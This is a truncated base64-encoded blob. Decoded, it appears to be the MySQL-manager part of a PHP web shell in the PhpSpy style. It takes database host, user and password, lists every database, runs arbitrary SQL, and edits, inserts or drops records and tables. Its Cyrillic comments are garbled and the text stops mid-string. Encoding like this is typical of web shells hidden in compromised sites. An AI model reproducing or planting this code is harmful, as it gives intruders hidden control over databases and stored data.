YXJyYXkoJ3RpdGxlJz0+J01ZU1FMIE1hbmFnZXInKSk7IA0KICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOyANCiAgICBwKCc8cD4nKTsgDQogICAgcCgnREJIb3N0OicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGJob3N0Jywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiRkYmhvc3QpKTsgDQogICAgcCgnOicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGJwb3J0Jywnc2l6ZSc9PjQsJ3ZhbHVlJz0+JGRicG9ydCkpOyANCiAgICBwKCdEQlVzZXI6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnVzZXInLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JGRidXNlcikpOyANCiAgICBwKCdEQlBhc3M6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnBhc3MnLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JGRicGFzcykpOyANCiAgICBwKCdEQkNoYXJzZXQ6Jyk7IA0KICAgIG1ha2VzZWxlY3QoYXJyYXkoJ25hbWUnPT4nY2hhcnNldCcsJ29wdGlvbic9PiRjaGFyc2V0cywnc2VsZWN0ZWQnPT4kY2hhcnNldCkpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nY29ubmVjdCcsJ3ZhbHVlJz0+J0Nvbm5lY3QnLCd0eXBlJz0+J3N1Ym1pdCcsJ2NsYXNzJz0+J2J0JykpOyANCiAgICBwKCc8L3A+Jyk7IA0KICAgIGZvcm1mb290KCk7IA0KPz4gDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+IA0KZnVuY3Rpb24gZWRpdHJlY29yZChhY3Rpb24sIGJhc2U2NCwgdGFibGVuYW1lKXsgDQogICAgaWYgKGFjdGlvbiA9PSAnZGVsJykgeyAgICAgICAgIA0KICAgICAgICBpZiAoIWNvbmZpcm0oJ0lzIG9yIGlzblwndCBkZWxldGlvbiByZWNvcmQ/JykpIHJldHVybjsgDQogICAgfSANCiAgICAkKCdyZWNvcmRsaXN0JykuZG9pbmcudmFsdWU9YWN0aW9uOyANCiAgICAkKCdyZWNvcmRsaXN0JykuYmFzZTY0LnZhbHVlPWJhc2U2NDsgDQogICAgJCgncmVjb3JkbGlzdCcpLnRhYmxlbmFtZS52YWx1ZT10YWJsZW5hbWU7IA0KICAgICQoJ3JlY29yZGxpc3QnKS5zdWJtaXQoKTsgDQp9IA0KZnVuY3Rpb24gbW9kZGJuYW1lKGRibmFtZSkgeyANCiAgICBpZighZGJuYW1lKSByZXR1cm47IA0KICAgICQoJ3NldGRibmFtZScpLmRibmFtZS52YWx1ZT1kYm5hbWU7IA0KICAgICQoJ3NldGRibmFtZScpLnN1Ym1pdCgpOyANCn0gDQpmdW5jdGlvbiBzZXR0YWJsZSh0YWJsZW5hbWUsZG9pbmcscGFnZSkgeyANCiAgICBpZighdGFibGVuYW1lKSByZXR1cm47IA0KICAgIGlmIChkb2luZykgeyANCiAgICAgICAgJCgnc2V0dGFibGUnKS5kb2luZy52YWx1ZT1kb2luZzsgDQogICAgfSANCiAgICBpZiAocGFnZSkgeyANCiAgICAgICAgJCgnc2V0dGFibGUnKS5wYWdlLnZhbHVlPXBhZ2U7IA0KICAgIH0gDQogICAgJCgnc2V0dGFibGUnKS50YWJsZW5hbWUudmFsdWU9dGFibGVuYW1lOyANCiAgICAkKCdzZXR0YWJsZScpLnN1Ym1pdCgpOyANCn0gDQo8L3NjcmlwdD4gDQo8P3BocCANCiAgICAvL9CT4oCa0JLQhtCT0ZPQsuKAntGe0JPRk9Cy0ILigJ3Qk9GT0JLCt9CT4oCa0JLRmNCT0ZPQstCC0I7Qk9GT0LLQgtGZ0JPigJrQktGYIA0KICAgIGZvcm1oZWFkKGFycmF5KCduYW1lJz0+J3JlY29yZGxpc3QnKSk7IA0KICAgIG1ha2VoaWRlKCdkb2luZycpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnc3FsYWRtaW4nKTsgDQogICAgbWFrZWhpZGUoJ2Jhc2U2NCcpOyANCiAgICBtYWtlaGlkZSgndGFibGVuYW1lJyk7IA0KICAgIHAoJGRiZm9ybSk7IA0KICAgIGZvcm1mb290KCk7IA0KDQogICAgLy/Qk9GT0LLQgu+/vdCT4oCa0JLQjtCT4oCa0JLCttCT4oCa0JLQgdCT0ZPQlSDQk9GT0JLQhdCT4oCa0JLRldCT0ZPQv9GX0IXQk+KAmtCS0ZfQk9GT0JLRniANCiAgICBmb3JtaGVhZChhcnJheSgnbmFtZSc9PidzZXRkYm5hbWUnKSk7IA0KICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOyANCiAgICBwKCRkYmZvcm0pOyANCiAgICBpZiAoISRkYm5hbWUpIHsgDQogICAgICAgIG1ha2VoaWRlKCdkYm5hbWUnKTsgDQogICAgfSANCiAgICBmb3JtZm9vdCgpOyANCg0KICAgIC8v0JPRk9Cy0ILvv73Qk+KAmtCS0I7Qk+KAmtCSwrbQk+KAmtCS0IHQk+KAmtCSwrHQk9GT0JIgDQogICAgZm9ybWhlYWQoYXJyYXkoJ25hbWUnPT4nc2V0dGFibGUnKSk7IA0KICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOyANCiAgICBwKCRkYmZvcm0pOyANCiAgICBtYWtlaGlkZSgndGFibGVuYW1lJyk7IA0KICAgIG1ha2VoaWRlKCdwYWdlJywkcGFnZSk7IA0KICAgIG1ha2VoaWRlKCdkb2luZycpOyANCiAgICBmb3JtZm9vdCgpOyANCg0KICAgICRjYWNoZXRhYmxlcyA9IGFycmF5KCk7ICAgICANCiAgICAkcGFnZW51bSA9IDMwOyANCiAgICAkcGFnZSA9IGludHZhbCgkcGFnZSk7IA0KICAgIGlmKCRwYWdlKSB7IA0KICAgICAgICAkc3RhcnRfbGltaXQgPSAoJHBhZ2UgLSAxKSAqICRwYWdlbnVtOyANCiAgICB9IGVsc2UgeyANCiAgICAgICAgJHN0YXJ0X2xpbWl0ID0gMDsgDQogICAgICAgICRwYWdlID0gMTsgDQogICAgfSANCiAgICBpZiAoaXNzZXQoJGRiaG9zdCkgJiYgaXNzZXQoJGRidXNlcikgJiYgaXNzZXQoJGRicGFzcykgJiYgaXNzZXQoJGNvbm5lY3QpKSB7IA0KICAgICAgICBkYmNvbm4oJGRiaG9zdCwgJGRidXNlciwgJGRicGFzcywgJGRibmFtZSwgJGNoYXJzZXQsICRkYnBvcnQpOyANCiAgICAgICAgLy/Qk+KAmtCSwrvQk9GT0JLCsdCT0ZPQm+KAoNCT4oCa0JLQjtCT0ZPQlSDQk9GT0JLQhdCT4oCa0JLRldCT0ZPQv9GX0IXQk+KAmtCS0ZfQk9GT0JLRntCT0ZPQv9GX0IXQk9GT0LLQgsKm0JPRk9C/0ZfQhdCT4oCa0JLRniANCiAgICAgICAgJG15c3FsdmVyID0gbXlzcWxfZ2V0X3NlcnZlcl9pbmZvKCk7IA0KICAgICAgICBwKCc8cD5NeVNRTCAnLiRteXNxbHZlci4nIHJ1bm5pbmcgaW4gJy4kZGJob3N0LicgYXMgJy4kZGJ1c2VyLidAJy4kZGJob3N0Lic8L3A+Jyk7IA0KICAgICAgICAkaGlnaHZlciA9ICRteXNxbHZlciA+ICc0LjEnID8gMSA6IDA7IA0KDQogICAgICAgIC8v0JPigJrQksK70JPRk9CSwrHQk9GT0JvigKDQk+KAmtCS0I7Qk9GT0JUg0JPRk9CS0IXQk+KAmtCS0ZXQk9GT0L/Rl9CF0JPigJrQktGX0JPRk9CS0Z4gDQogICAgICAgICRxdWVyeSA9IHEoIlNIT1cgREFUQUJBU0VTIik7IA0KICAgICAgICAkZGJzID0gYXJyYXkoKTsgDQogICAgICAgICRkYnNbXSA9ICctLSBTZWxlY3QgYSBkYXRhYmFzZSAtLSc7IA0KICAgICAgICB3aGlsZSgkZGIgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKSB7IA0KICAgICAgICAgICAgJGRic1skZGJbJ0RhdGFiYXNlJ11dID0gJGRiWydEYXRhYmFzZSddOyANCiAgICAgICAgfSANCiAgICAgICAgbWFrZXNlbGVjdChhcnJheSgndGl0bGUnPT4nUGxlYXNlIHNlbGVjdCBhIGRhdGFiYXNlOicsJ25hbWUnPT4nZGJbXScsJ29wdGlvbic9PiRkYnMsJ3NlbGVjdGVkJz0+JGRibmFtZSwnb25jaGFuZ2UnPT4nbW9kZGJuYW1lKHRoaXMub3B0aW9uc1t0aGlzLnNlbGVjdGVkSW5kZXhdLnZhbHVlKScsJ25ld2xpbmUnPT4xKSk7IA0KICAgICAgICAgDQogICAgICAgICR0YWJsZWRiID0gYXJyYXkoKTsgDQogICAgICAgIGlmICgkZGJuYW1lKSB7IA0KICAgICAgICAgICAgcCgnPHA+Jyk7IA0KICAgICAgICAgICAgcCgnQ3VycmVudCBkYWJhYmFzZTogPGEgaHJlZj0iamF2YXNjcmlwdDptb2RkYm5hbWUoXCcnLiRkYm5hbWUuJ1wnKTsiPicuJGRibmFtZS4nPC9hPicpOyANCiAgICAgICAgICAgIGlmICgkdGFibGVuYW1lKSB7IA0KICAgICAgICAgICAgICAgIHAoJyB8IEN1cnJlbnQgVGFibGU6IDxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZW5hbWUuJ1wnKTsiPicuJHRhYmxlbmFtZS4nPC9hPiBbIDxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZW5hbWUuJ1wnLCBcJ2luc2VydFwnKTsiPkluc2VydDwvYT4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdzdHJ1Y3R1cmVcJyk7Ij5TdHJ1Y3R1cmU8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCcsIFwnZHJvcFwnKTsiPkRyb3A8L2E+IF0nKTsgDQogICAgICAgICAgICB9IA0KICAgICAgICAgICAgcCgnPC9wPicpOyANCiAgICAgICAgICAgIG15c3FsX3NlbGVjdF9kYigkZGJuYW1lKTsgDQoNCiAgICAgICAgICAgICRnZXRudW1zcWwgPSAnJzsgDQogICAgICAgICAgICAkcnVucXVlcnkgPSAwOyANCiAgICAgICAgICAgIGlmICgkc3FsX3F1ZXJ5KSB7IA0KICAgICAgICAgICAgICAgICRydW5xdWVyeSA9IDE7IA0KICAgICAgICAgICAgfSANCiAgICAgICAgICAgICRhbGxvd2VkaXQgPSAwOyANCiAgICAgICAgICAgIGlmICgkdGFibGVuYW1lICYmICEkc3FsX3F1ZXJ5KSB7IA0KICAgICAgICAgICAgICAgICRzcWxfcXVlcnkgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIjsgDQogICAgICAgICAgICAgICAgJGdldG51bXNxbCA9ICRzcWxfcXVlcnk7IA0KICAgICAgICAgICAgICAgICRzcWxfcXVlcnkgPSAkc3FsX3F1ZXJ5LiIgTElNSVQgJHN0YXJ0X2xpbWl0LCAkcGFnZW51bSI7IA0KICAgICAgICAgICAgICAgICRhbGxvd2VkaXQgPSAxOyANCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICBwKCc8Zm9ybSBhY3Rpb249IicuJHNlbGYuJyIgbWV0aG9kPSJQT1NUIj4nKTsgDQogICAgICAgICAgICBwKCc8cD48dGFibGUgd2lkdGg9IjIwMCIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPjx0cj48dGQgY29sc3Bhbj0iMiI+UnVuIFNRTCBxdWVyeS9xdWVyaWVzIG9uIGRhdGFiYXNlICcuJGRibmFtZS4nOjwvdGQ+PC90cj48dHI+PHRkPjx0ZXh0YXJlYSBuYW1lPSJzcWxfcXVlcnkiIGNsYXNzPSJhcmVhIiBzdHlsZT0id2lkdGg6NjAwcHg7aGVpZ2h0OjUwcHg7b3ZlcmZsb3c6YXV0bzsiPicuaHRtbHNwZWNpYWxjaGFycygkc3FsX3F1ZXJ5LEVOVF9RVU9URVMpLic8L3RleHRhcmVhPjwvdGQ+PHRkIHN0eWxlPSJwYWRkaW5nOjAgNXB4OyI+PGlucHV0IGNsYXNzPSJidCIgc3R5bGU9ImhlaWdodDo1MHB4OyIgbmFtZT0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJRdWVyeSIgLz48L3RkPjwvdHI+PC90YWJsZT48L3A+Jyk7IA0KICAgICAgICAgICAgbWFrZWhpZGUoJ3RhYmxlbmFtZScsICR0YWJsZW5hbWUpOyANCiAgICAgICAgICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOyANCiAgICAgICAgICAgIHAoJGRiZm9ybSk7IA0KICAgICAgICAgICAgcCgnPC9mb3JtPicpOyANCiAgICAgICAgICAgIGlmICgkdGFibGVuYW1lIHx8ICgkcnVucXVlcnkgJiYgJHNxbF9xdWVyeSkpIHsgDQogICAgICAgICAgICAgICAgaWYgKCRkb2luZyA9PSAnc3RydWN0dXJlJykgeyANCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IHEoIlNIT1cgQ09MVU1OUyBGUk9NICR0YWJsZW5hbWUiKTsgDQogICAgICAgICAgICAgICAgICAgICRyb3dkYiA9IGFycmF5KCk7IA0KICAgICAgICAgICAgICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAkcm93ZGJbXSA9ICRyb3c7IA0KICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICBwKCc8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjAiPicpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRyIGNsYXNzPSJoZWFkIj4nKTsgDQogICAgICAgICAgICAgICAgICAgIHAoJzx0ZD5GaWVsZDwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+VHlwZTwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+TnVsbDwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+S2V5PC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgIHAoJzx0ZD5EZWZhdWx0PC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgIHAoJzx0ZD5FeHRyYTwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBwKCc8L3RyPicpOyANCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJHJvd2RiIGFzICRyb3cpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpc2JnID0gYmcoKTsgDQogICAgICAgICAgICAgICAgICAgICAgICBwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgcCgnPHRkPicuJHJvd1snRmllbGQnXS4nPC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+Jy4kcm93WydUeXBlJ10uJzwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgcCgnPHRkPicuJHJvd1snTnVsbCddLicmbmJzcDs8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzx0ZD4nLiRyb3dbJ0tleSddLicmbmJzcDs8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzx0ZD4nLiRyb3dbJ0RlZmF1bHQnXS4nJm5ic3A7PC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+Jy4kcm93WydFeHRyYSddLicmbmJzcDs8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzwvdHI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICB0YmZvb3QoKTsgDQogICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRkb2luZyA9PSAnaW5zZXJ0JyB8fCAkZG9pbmcgPT0gJ2VkaXQnKSB7IA0KICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcSgnU0hPVyBDT0xVTU5TIEZST00gJy4kdGFibGVuYW1lKTsgDQogICAgICAgICAgICAgICAgICAgIHdoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAkcm93ZGJbXSA9ICRyb3c7IA0KICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAkcnMgPSBhcnJheSgpOyANCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkb2luZyA9PSAnaW5zZXJ0JykgeyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzxoMj5JbnNlcnQgbmV3IGxpbmUgaW4gJy4kdGFibGVuYW1lLicgdGFibGUgJnJhcXVvOzwvaDI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzxoMj5VcGRhdGUgcmVjb3JkIGluICcuJHRhYmxlbmFtZS4nIHRhYmxlICZyYXF1bzs8L2gyPicpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICR3aGVyZSA9IGJhc2U2NF9kZWNvZGUoJGJhc2U2NCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IHEoIlNFTEVDVCAqIEZST00gJHRhYmxlbmFtZSBXSEVSRSAkd2hlcmUgTElNSVQgMSIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICRycyA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpOyANCiAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgcCgnPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IicuJHNlbGYuJyI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBwKCRkYmZvcm0pOyANCiAgICAgICAgICAgICAgICAgICAgbWFrZWhpZGUoJ2FjdGlvbicsJ3NxbGFkbWluJyk7IA0KICAgICAgICAgICAgICAgICAgICBtYWtlaGlkZSgndGFibGVuYW1lJywkdGFibGVuYW1lKTsgDQogICAgICAgICAgICAgICAgICAgIHAoJzx0YWJsZSBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMCI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkcm93ZGIgYXMgJHJvdykgeyANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkcnNbJHJvd1snRmllbGQnXV0pIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gaHRtbHNwZWNpYWxjaGFycygkcnNbJHJvd1snRmllbGQnXV0pOyANCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2YWx1ZSA9ICcnOyANCiAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpc2JnID0gYmcoKTsgDQogICAgICAgICAgICAgICAgICAgICAgICBwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgcCgnPHRkPjxiPicuJHJvd1snRmllbGQnXS4nPC9iPjxiciAvPicuJHJvd1snVHlwZSddLic8L3RkPjx0ZD48dGV4dGFyZWEgY2xhc3M9ImFyZWEiIG5hbWU9Imluc2VydHNxbFsnLiRyb3dbJ0ZpZWxkJ10uJ10iIHN0eWxlPSJ3aWR0aDo1MDBweDtoZWlnaHQ6NjBweDtvdmVyZmxvdzphdXRvOyI+Jy4kdmFsdWUuJzwvdGV4dGFyZWE+PC90ZD48L3RyPicpOyANCiAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkb2luZyA9PSAnaW5zZXJ0JykgeyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzx0ciBjbGFzcz0iJy5iZygpLiciPjx0ZCBjb2xzcGFuPSIyIj48aW5wdXQgY2xhc3M9ImJ0IiB0eXBlPSJzdWJtaXQiIG5hbWU9Imluc2VydCIgdmFsdWU9Ikluc2VydCIgLz48L3RkPjwvdHI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgICAgICAgICAgIHAoJzx0ciBjbGFzcz0iJy5iZygpLiciPjx0ZCBjb2xzcGFuPSIyIj48aW5wdXQgY2xhc3M9ImJ0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InVwZGF0ZSIgdmFsdWU9IlVwZGF0ZSIgLz48L3RkPjwvdHI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgbWFrZWhpZGUoJ2Jhc2U2NCcsICRiYXNlNjQpOyANCiAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgcCgnPC90YWJsZT48L2Zvcm0+Jyk7IA0KICAgICAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICAgICAkcXVlcnlzID0gQGV4cGxvZGUoJzsnLCRzcWxfcXVlcnkpOyANCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkcXVlcnlzIGFzICRudW09PiRxdWVyeSkgeyANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkcXVlcnkpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcCgiPHA+PGI+UXVlcnkjeyRudW19IDogIi5odG1sc3BlY2lhbGNoYXJzKCRxdWVyeSxFTlRfUVVPVEVTKS4iPC9iPjwvcD4iKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoKHF5KCRxdWVyeSkpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMDogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwKCc8aDI+RXJyb3IgOiAnLm15c3FsX2Vycm9yKCkuJzwvaDI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7ICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAxOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJ0b2xvd2VyKHN1YnN0cigkcXVlcnksMCwxMykpID09ICdzZWxlY3QgKiBmcm9tJykgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYWxsb3dlZGl0ID0gMTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRnZXRudW1zcWwpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhdG9sID0gbXlzcWxfbnVtX3Jvd3MocSgkZ2V0bnVtc3FsKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtdWx0aXBhZ2UgPSBtdWx0aSgkdGF0b2wsICRwYWdlbnVtLCAkcGFnZSwgJHRhYmxlbmFtZSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRhYmxlbmFtZSkgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWxfbGluZSA9IHN0cl9yZXBsYWNlKGFycmF5KCJcciIsICJcbiIsICJcdCIpLCBhcnJheSgnICcsICcgJywgJyAnKSwgdHJpbShodG1sc3BlY2lhbGNoYXJzKCRxdWVyeSkpKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNxbF9saW5lID0gcHJlZ19yZXBsYWNlKCIvXC9cKlteKFwqXC8pXSpcKlwvL2kiLCAiICIsICRzcWxfbGluZSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2hfYWxsKCIvZnJvbVxzK2B7MCwxfShbXHddKylgezAsMX1ccysvaSIsJHNxbF9saW5lLCRtYXRjaGVzKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmxlbmFtZSA9ICRtYXRjaGVzWzFdWzBdOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcSgkcXVlcnkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAoJG11bHRpcGFnZSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCgnPHRhYmxlIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIwIj4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwKCc8dHIgY2xhc3M9ImhlYWQiPicpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkYWxsb3dlZGl0KSBwKCc8dGQ+QWN0aW9uPC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmllbGRudW0gPSBAbXlzcWxfbnVtX2ZpZWxkcygkcmVzdWx0KTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IoJGk9MDskaTwkZmllbGRudW07JGkrKyl7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRuYW1lID0gQG15c3FsX2ZpZWxkX25hbWUoJHJlc3VsdCwgJGkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSA9IEBteXNxbF9maWVsZF90eXBlKCRyZXN1bHQsICRpKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9IEBteXNxbF9maWVsZF9sZW4oJHJlc3VsdCwgJGkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwKCI8dGQgbm93cmFwPiRuYW1lPGJyPjxzcGFuPiR0eXBlKCRsZW4pPC9zcGFuPjwvdGQ+Iik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAoJzwvdHI+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUoJG1uID0gQG15c3FsX2ZldGNoX2Fzc29jKCRyZXN1bHQpKXsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXNiZyA9IGJnKCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAoJzx0ciBjbGFzcz0iJy4kdGhpc2JnLiciIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJycuJHRoaXNiZy4nXCc7Ij4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdoZXJlID0gJHRtcCA9ICRiMSA9ICcnOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCRtbiBhcyAka2V5PT4kaW5zaWRlKXsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaW5zaWRlKSB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdoZXJlIC49ICR0bXAuJGtleS4iPSciLmFkZHNsYXNoZXMoJGluc2lkZSkuIiciOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0bXAgPSAnIEFORCAnOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGIxIC49ICc8dGQgbm93cmFwPicuaHRtbF9jbGVhbigkaW5zaWRlKS4nJm5ic3A7PC90ZD4nOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR3aGVyZSA9IGJhc2U2NF